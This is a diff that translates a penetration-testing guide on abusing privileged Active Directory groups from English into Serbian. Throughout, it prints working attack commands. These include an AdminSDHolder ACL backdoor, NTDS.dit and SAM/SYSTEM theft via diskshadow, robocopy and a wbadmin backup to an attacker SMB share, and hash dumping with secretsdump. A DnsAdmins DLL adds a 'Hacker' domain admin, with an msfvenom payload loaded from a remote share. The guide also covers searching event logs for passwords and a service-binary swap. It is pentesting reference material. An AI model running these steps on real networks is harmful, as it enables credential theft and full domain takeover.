@@ -4,112 +4,95 @@
 
 <figure><img src="/images/image (48).png" alt=""><figcaption></figcaption></figure>
 
-Use [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
-Get Access Today:
+Koristite [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection) za lako kreiranje i **automatizaciju radnih tokova** pokretanih **najnaprednijim** alatima zajednice na svetu.\
+Pribavite pristup danas:
 
 {% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=command-injection" %}
 
-## Well Known groups with administration privileges
+## Poznate grupe sa administratorskim privilegijama
 
-- **Administrators**
+- **Administratori**
 - **Domain Admins**
 - **Enterprise Admins**
 
-## Account Operators
+## Operatori naloga
 
-This group is empowered to create accounts and groups that are not administrators on the domain. Additionally, it enables local login to the Domain Controller (DC).
+Ova grupa ima ovlašćenje da kreira naloge i grupe koje nisu administratori na domenu. Pored toga, omogućava lokalno prijavljivanje na Kontroler domena (DC).
 
-To identify the members of this group, the following command is executed:
-
+Da bi se identifikovali članovi ove grupe, izvršava se sledeća komanda:
 ```powershell
 Get-NetGroupMember -Identity "Account Operators" -Recurse
 ```
+Dodavanje novih korisnika je dozvoljeno, kao i lokalna prijava na DC01.
 
-Adding new users is permitted, as well as local login to DC01.
+## AdminSDHolder grupa
 
-## AdminSDHolder group
+Access Control List (ACL) grupe **AdminSDHolder** je ključna jer postavlja dozvole za sve "zaštićene grupe" unutar Active Directory, uključujući grupe sa visokim privilegijama. Ovaj mehanizam osigurava bezbednost ovih grupa sprečavanjem neovlašćenih izmena.
 
-The **AdminSDHolder** group's Access Control List (ACL) is crucial as it sets permissions for all "protected groups" within Active Directory, including high-privilege groups. This mechanism ensures the security of these groups by preventing unauthorized modifications.
+Napadač bi mogao da iskoristi ovo modifikovanjem ACL-a grupe **AdminSDHolder**, dodeljujući pune dozvole standardnom korisniku. Ovo bi efikasno dalo tom korisniku punu kontrolu nad svim zaštićenim grupama. Ako se dozvole ovog korisnika promene ili uklone, one bi se automatski vratile u roku od sat vremena zbog dizajna sistema.
 
-An attacker could exploit this by modifying the **AdminSDHolder** group's ACL, granting full permissions to a standard user. This would effectively give that user full control over all protected groups. If this user's permissions are altered or removed, they would be automatically reinstated within an hour due to the system's design.
-
-Commands to review the members and modify permissions include:
-
+Komande za pregled članova i modifikaciju dozvola uključuju:
 ```powershell
 Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
 Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
 Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
 ```
+Dostupan je skript za ubrzavanje procesa vraćanja: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).
 
-A script is available to expedite the restoration process: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).
-
-For more details, visit [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).
+Za više detalja, posetite [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).
 
 ## AD Recycle Bin
 
-Membership in this group allows for the reading of deleted Active Directory objects, which can reveal sensitive information:
-
+Članstvo u ovoj grupi omogućava čitanje obrisanih objekata Active Directory-a, što može otkriti osetljive informacije:
 ```bash
 Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
 ```
+### Pristup Kontroleru Domen
 
-### Domain Controller Access
+Pristup datotekama na DC-u je ograničen osim ako korisnik nije deo grupe `Server Operators`, što menja nivo pristupa.
 
-Access to files on the DC is restricted unless the user is part of the `Server Operators` group, which changes the level of access.
+### Eskalacija Privilegija
 
-### Privilege Escalation
-
-Using `PsService` or `sc` from Sysinternals, one can inspect and modify service permissions. The `Server Operators` group, for instance, has full control over certain services, allowing for the execution of arbitrary commands and privilege escalation:
-
+Korišćenjem `PsService` ili `sc` iz Sysinternals, može se pregledati i modifikovati dozvole servisa. Grupa `Server Operators`, na primer, ima potpunu kontrolu nad određenim servisima, što omogućava izvršavanje proizvoljnih komandi i eskalaciju privilegija:
 ```cmd
 C:\> .\PsService.exe security AppReadiness
 ```
-
-This command reveals that `Server Operators` have full access, enabling the manipulation of services for elevated privileges.
+Ova komanda otkriva da `Server Operators` imaju potpuni pristup, omogućavajući manipulaciju uslugama za povišene privilegije.
 
 ## Backup Operators
 
-Membership in the `Backup Operators` group provides access to the `DC01` file system due to the `SeBackup` and `SeRestore` privileges. These privileges enable folder traversal, listing, and file copying capabilities, even without explicit permissions, using the `FILE_FLAG_BACKUP_SEMANTICS` flag. Utilizing specific scripts is necessary for this process.
+Članstvo u grupi `Backup Operators` pruža pristup `DC01` datotečnom sistemu zbog privilegija `SeBackup` i `SeRestore`. Ove privilegije omogućavaju pretraživanje foldera, listanje i kopiranje datoteka, čak i bez eksplicitnih dozvola, koristeći `FILE_FLAG_BACKUP_SEMANTICS` flag. Korišćenje specifičnih skripti je neophodno za ovaj proces.
 
-To list group members, execute:
-
+Da biste naveli članove grupe, izvršite:
 ```powershell
 Get-NetGroupMember -Identity "Backup Operators" -Recurse
 ```
+### Lokalni Napad
 
-### Local Attack
+Da bi se iskoristile ove privilegije lokalno, koriste se sledeći koraci:
 
-To leverage these privileges locally, the following steps are employed:
-
-1. Import necessary libraries:
-
+1. Uvezi potrebne biblioteke:
 ```bash
 Import-Module .\SeBackupPrivilegeUtils.dll
 Import-Module .\SeBackupPrivilegeCmdLets.dll
 ```
-
-2. Enable and verify `SeBackupPrivilege`:
-
+2. Omogućite i verifikujte `SeBackupPrivilege`:
 ```bash
 Set-SeBackupPrivilege
 Get-SeBackupPrivilege
 ```
-
-3. Access and copy files from restricted directories, for instance:
-
+3. Pristupite i kopirajte datoteke iz ograničenih direktorijuma, na primer:
 ```bash
 dir C:\Users\Administrator\
 Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
 ```
-
 ### AD Attack
 
-Direct access to the Domain Controller's file system allows for the theft of the `NTDS.dit` database, which contains all NTLM hashes for domain users and computers.
+Direktan pristup datotečnom sistemu kontrolera domena omogućava krađu `NTDS.dit` baze podataka, koja sadrži sve NTLM hešove za korisnike i računare u domenu.
 
 #### Using diskshadow.exe
 
-1. Create a shadow copy of the `C` drive:
-
+1. Napravite senku kopiju `C` diska:
 ```cmd
 diskshadow.exe
 set verbose on
@@ -122,59 +105,47 @@ expose %cdrive% F:
 end backup
 exit
 ```
-
-2. Copy `NTDS.dit` from the shadow copy:
-
+2. Kopirajte `NTDS.dit` iz senčne kopije:
 ```cmd
 Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
 ```
-
-Alternatively, use `robocopy` for file copying:
-
+Alternativno, koristite `robocopy` za kopiranje fajlova:
 ```cmd
 robocopy /B F:\Windows\NTDS .\ntds ntds.dit
 ```
-
-3. Extract `SYSTEM` and `SAM` for hash retrieval:
-
+3. Izvucite `SYSTEM` i `SAM` za preuzimanje hash-a:
 ```cmd
 reg save HKLM\SYSTEM SYSTEM.SAV
 reg save HKLM\SAM SAM.SAV
 ```
-
-4. Retrieve all hashes from `NTDS.dit`:
-
+4. Preuzmite sve hash-e iz `NTDS.dit`:
 ```shell-session
 secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
 ```
+#### Korišćenje wbadmin.exe
 
-#### Using wbadmin.exe
+1. Postavite NTFS fajl sistem za SMB server na mašini napadača i keširajte SMB akreditive na cilјnoj mašini.
+2. Koristite `wbadmin.exe` za sistemsku rezervnu kopiju i ekstrakciju `NTDS.dit`:
+```cmd
+net use X: \\<AttackIP>\sharename /user:smbuser password
+echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
+wbadmin get versions
+echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
+```
 
-1. Set up NTFS filesystem for SMB server on attacker machine and cache SMB credentials on the target machine.
-2. Use `wbadmin.exe` for system backup and `NTDS.dit` extraction:
-   ```cmd
-   net use X: \\<AttackIP>\sharename /user:smbuser password
-   echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
-   wbadmin get versions
-   echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
-   ```
-
-For a practical demonstration, see [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).
+Za praktičnu demonstraciju, pogledajte [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).
 
 ## DnsAdmins
 
-Members of the **DnsAdmins** group can exploit their privileges to load an arbitrary DLL with SYSTEM privileges on a DNS server, often hosted on Domain Controllers. This capability allows for significant exploitation potential.
+Članovi **DnsAdmins** grupe mogu iskoristiti svoje privilegije da učitaju proizvoljni DLL sa SYSTEM privilegijama na DNS serveru, koji se često hostuje na kontrolerima domena. Ova sposobnost omogućava značajan potencijal za eksploataciju.
 
-To list members of the DnsAdmins group, use:
-
+Da biste nabrojali članove DnsAdmins grupe, koristite:
 ```powershell
 Get-NetGroupMember -Identity "DnsAdmins" -Recurse
 ```
+### Izvrši proizvoljni DLL
 
-### Execute arbitrary DLL
-
-Members can make the DNS server load an arbitrary DLL (either locally or from a remote share) using commands such as:
-
+Članovi mogu naterati DNS server da učita proizvoljni DLL (bilo lokalno ili sa udaljenog dela) koristeći komande kao što su:
 ```powershell
 dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
 dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
@@ -185,8 +156,8 @@ An attacker could modify the DLL to add a user to the Domain Admins group or exe
 // Modify DLL to add user
 DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
 {
-    system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
-    system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
+system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
+system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
 }
 ```
 
@@ -194,107 +165,90 @@ DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunct
 // Generate DLL with msfvenom
 msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
 ```
-
-Restarting the DNS service (which may require additional permissions) is necessary for the DLL to be loaded:
-
+Ponovno pokretanje DNS usluge (što može zahtevati dodatne dozvole) je neophodno da bi se DLL učitao:
 ```csharp
 sc.exe \\dc01 stop dns
 sc.exe \\dc01 start dns
 ```
-
-For more details on this attack vector, refer to ired.team.
+Za više detalja o ovom napadnom vektoru, pogledajte ired.team.
 
 #### Mimilib.dll
 
-It's also feasible to use mimilib.dll for command execution, modifying it to execute specific commands or reverse shells. [Check this post](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) for more information.
+Takođe je moguće koristiti mimilib.dll za izvršavanje komandi, modifikujući ga da izvršava specifične komande ili reverzne shell-ove. [Pogledajte ovaj post](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) za više informacija.
 
-### WPAD Record for MitM
+### WPAD zapis za MitM
 
-DnsAdmins can manipulate DNS records to perform Man-in-the-Middle (MitM) attacks by creating a WPAD record after disabling the global query block list. Tools like Responder or Inveigh can be used for spoofing and capturing network traffic.
+DnsAdmins mogu manipulisati DNS zapisima da bi izveli napade Man-in-the-Middle (MitM) kreiranjem WPAD zapisa nakon onemogućavanja globalne liste blokiranih upita. Alati poput Responder ili Inveigh mogu se koristiti za spoofing i hvatanje mrežnog saobraćaja.
 
-### Event Log Readers
-Members can access event logs, potentially finding sensitive information such as plaintext passwords or command execution details:
-
+### Čitaoci događaja
+Članovi mogu pristupiti zapisima događaja, potencijalno pronalazeći osetljive informacije kao što su lozinke u običnom tekstu ili detalji izvršavanja komandi:
 ```powershell
 # Get members and search logs for sensitive information
 Get-NetGroupMember -Identity "Event Log Readers" -Recurse
 Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
 ```
-
 ## Exchange Windows Permissions
 
-This group can modify DACLs on the domain object, potentially granting DCSync privileges. Techniques for privilege escalation exploiting this group are detailed in Exchange-AD-Privesc GitHub repo.
-
+Ova grupa može da menja DACL-ove na objektu domena, potencijalno dodeljujući DCSync privilegije. Tehnike za eskalaciju privilegija koje koriste ovu grupu su detaljno opisane u Exchange-AD-Privesc GitHub repozitorijumu.
 ```powershell
 # List members
 Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
 ```
+## Hyper-V Administratori
 
-## Hyper-V Administrators
+Hyper-V Administratori imaju potpuni pristup Hyper-V, što se može iskoristiti za preuzimanje kontrole nad virtuelizovanim Domen kontrolerima. To uključuje kloniranje aktivnih DC-ova i vađenje NTLM hash-eva iz NTDS.dit datoteke.
 
-Hyper-V Administrators have full access to Hyper-V, which can be exploited to gain control over virtualized Domain Controllers. This includes cloning live DCs and extracting NTLM hashes from the NTDS.dit file.
+### Primer Iskorišćavanja
 
-### Exploitation Example
-
-Firefox's Mozilla Maintenance Service can be exploited by Hyper-V Administrators to execute commands as SYSTEM. This involves creating a hard link to a protected SYSTEM file and replacing it with a malicious executable:
-
+Mozilla Maintenance Service u Firefox-u može biti iskorišćen od strane Hyper-V Administratora za izvršavanje komandi kao SYSTEM. To uključuje kreiranje hard linka do zaštićene SYSTEM datoteke i zamenu sa malicioznim izvršnim fajlom:
 ```bash
 # Take ownership and start the service
 takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
 sc.exe start MozillaMaintenance
 ```
+Napomena: Eksploatacija hard linkova je ublažena u nedavnim Windows ažuriranjima.
 
-Note: Hard link exploitation has been mitigated in recent Windows updates.
+## Organizacija Upravljanje
 
-## Organization Management
+U okruženjima gde je **Microsoft Exchange** implementiran, posebna grupa poznata kao **Organizacija Upravljanje** ima značajne mogućnosti. Ova grupa ima privilegiju da **pristupa poštanskim sandučetima svih korisnika domena** i održava **potpunu kontrolu nad 'Microsoft Exchange Security Groups'** Organizacijskom Jedinicom (OU). Ova kontrola uključuje **`Exchange Windows Permissions`** grupu, koja se može iskoristiti za eskalaciju privilegija.
 
-In environments where **Microsoft Exchange** is deployed, a special group known as **Organization Management** holds significant capabilities. This group is privileged to **access the mailboxes of all domain users** and maintains **full control over the 'Microsoft Exchange Security Groups'** Organizational Unit (OU). This control includes the **`Exchange Windows Permissions`** group, which can be exploited for privilege escalation.
+### Eksploatacija Privilegija i Komande
 
-### Privilege Exploitation and Commands
+#### Operateri Štampača
 
-#### Print Operators
+Članovi grupe **Operateri Štampača** imaju nekoliko privilegija, uključujući **`SeLoadDriverPrivilege`**, koja im omogućava da **se lokalno prijave na Kontroler Domena**, isključe ga i upravljaju štampačima. Da bi iskoristili ove privilegije, posebno ako **`SeLoadDriverPrivilege`** nije vidljiv u neuzdignutom kontekstu, potrebno je zaobići Kontrolu Korisničkog Naloga (UAC).
 
-Members of the **Print Operators** group are endowed with several privileges, including the **`SeLoadDriverPrivilege`**, which allows them to **log on locally to a Domain Controller**, shut it down, and manage printers. To exploit these privileges, especially if **`SeLoadDriverPrivilege`** is not visible under an unelevated context, bypassing User Account Control (UAC) is necessary.
-
-To list the members of this group, the following PowerShell command is used:
-
+Da biste naveli članove ove grupe, koristi se sledeća PowerShell komanda:
 ```powershell
 Get-NetGroupMember -Identity "Print Operators" -Recurse
 ```
+Za detaljnije tehnike eksploatacije vezane za **`SeLoadDriverPrivilege`**, treba konsultovati specifične bezbednosne resurse.
 
-For more detailed exploitation techniques related to **`SeLoadDriverPrivilege`**, one should consult specific security resources.
+#### Korisnici daljinskog pristupa
 
-#### Remote Desktop Users
-
-This group's members are granted access to PCs via Remote Desktop Protocol (RDP). To enumerate these members, PowerShell commands are available:
-
+Članovima ove grupe je odobren pristup računarima putem Protokola daljinskog pristupa (RDP). Da bi se izbrojali ovi članovi, dostupne su PowerShell komande:
 ```powershell
 Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
 Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
 ```
+Dalje informacije o eksploataciji RDP-a mogu se naći u posvećenim resursima za pentesting.
 
-Further insights into exploiting RDP can be found in dedicated pentesting resources.
+#### Korisnici za daljinsko upravljanje
 
-#### Remote Management Users
-
-Members can access PCs over **Windows Remote Management (WinRM)**. Enumeration of these members is achieved through:
-
+Članovi mogu pristupiti računarima putem **Windows Remote Management (WinRM)**. Enumeracija ovih članova se postiže kroz:
 ```powershell
 Get-NetGroupMember -Identity "Remote Management Users" -Recurse
 Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
 ```
-
-For exploitation techniques related to **WinRM**, specific documentation should be consulted.
+Za tehnike eksploatacije vezane za **WinRM**, treba konsultovati specifičnu dokumentaciju.
 
 #### Server Operators
 
-This group has permissions to perform various configurations on Domain Controllers, including backup and restore privileges, changing system time, and shutting down the system. To enumerate the members, the command provided is:
-
+Ova grupa ima dozvole za izvođenje raznih konfiguracija na kontrolerima domena, uključujući privilegije za pravljenje rezervnih kopija i vraćanje, promenu sistemskog vremena i isključivanje sistema. Da biste nabrojali članove, komanda koja se koristi je:
 ```powershell
 Get-NetGroupMember -Identity "Server Operators" -Recurse
 ```
-
-## References <a href="#references" id="references"></a>
+## Reference <a href="#references" id="references"></a>
 
 - [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
 - [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
@@ -313,10 +267,9 @@ Get-NetGroupMember -Identity "Server Operators" -Recurse
 
 <figure><img src="/images/image (48).png" alt=""><figcaption></figcaption></figure>
 
-Use [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
-Get Access Today:
+Koristite [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection) za lako kreiranje i **automatizaciju radnih tokova** pokretanih **najnaprednijim** alatima zajednice na svetu.\
+Pribavite pristup danas:
 
 {% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=command-injection" %}
 
 {{#include ../../banners/hacktricks-training.md}}
-
